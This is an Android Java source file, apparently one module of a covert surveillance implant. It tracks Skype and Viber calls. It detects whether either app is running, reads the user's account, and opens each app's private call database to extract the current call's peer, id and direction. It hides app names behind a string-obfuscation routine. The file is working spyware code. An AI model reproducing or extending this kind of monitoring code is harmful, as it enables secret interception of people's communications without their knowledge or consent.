package com.android.dvci.module.call;

import java.util.Date;

import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.module.chat.ChatSkype;
import com.android.dvci.module.chat.ChatViber;
import com.android.dvci.util.Check;
import com.android.mm.M;

public class CallInfo {
	private static final String TAG = "CallInfo";

	public int id;
	public String account;
	public String peer;
	public String displayName;
	public boolean incoming;
	public boolean valid;
	public String processName;
	public int programId;
	public Date timestamp;
	public boolean delay;
	public boolean heuristic;
	private long[] streamId = new long[2];

	public String getCaller() {
		if (!incoming) {
			return account;
		}
		return peer;
	}

	public String getCallee() {
		if (incoming) {
			return account;
		}
		return peer;
	}

	public boolean setStreamId(boolean remote, long streamId) {

		int pos = remote ? 1 : 0;
		if (streamId != this.streamId[pos]) {

			if (this.streamId[pos] != 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStreamId): Wrong streamId: " + this.streamId[pos] + " <- " + streamId + " "
							+ (remote ? "remote" : "local"));
				}
				this.streamId[pos] = streamId;
				return false;
			}

			this.streamId[pos] = streamId;
		}

		return true;
	}

	public boolean update(boolean end) {

		// RunningAppProcessInfo fore = runningProcesses.getForeground();
		if (this.valid) {
			return true;
		}

		ListenerProcess lp = ListenerProcess.self();
		if (Cfg.DEBUG_SPECIFIC) {
			Check.log(TAG + " (update):launced");
		}
		if (lp.isRunning(M.e("com.skype.raider"))) {
			if (Cfg.DELAY_SKYPE_CALL) {

				this.processName = M.e("com.skype.raider");
				// open DB

				this.programId = 0x0146;
				this.delay = true;
				this.heuristic = false;

				boolean ret = false;
				if (end) {
					String account = ChatSkype.readAccount();
					this.account = account;

					GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
					if (helper != null) {
						ret = ChatSkype.getCurrentCall(helper, this);
						if (Cfg.DEBUG) {
							Check.log(TAG + " (updateCallInfo): id: " + this.id + " peer: " + this.peer);
						}
					}
				} else {
					this.account = M.e("delay");
					this.peer = M.e("delay");
					ret = true;
				}

				return ret;
			} else {
				
				if (end) {
					return true;
				}
				this.processName = M.e("com.skype.raider");
				// open DB
				String account = ChatSkype.readAccount();
				this.account = account;
				this.programId = 0x0146;
				this.delay = false;
				this.heuristic = false;

				GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);

				boolean ret = false;
				if (helper != null) {
					ret = ChatSkype.getCurrentCall(helper, this);
					if (Cfg.DEBUG) {
						Check.log(TAG + " SKYPE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
					}
				}

				return ret;
			}
		} else if (lp.isRunning(M.e("com.viber.voip"))) {
			boolean ret = false;
			this.processName = M.e("com.viber.voip");
			this.delay = true;
			this.heuristic = true;

			// open DB
			this.programId = 0x0148;
			if (end) {
				String account = ChatViber.readAccount();
				this.account = account;
				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();

				if (helper != null) {
					ret = ChatViber.getCurrentCall(helper, this);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateCallInfo) id: " + this.id);
				}
			} else {
				this.account = M.e("delay");
				this.peer = M.e("delay");
				ret = true;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " VIBER (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
			}

			return ret;

		}
		return false;
	}
}
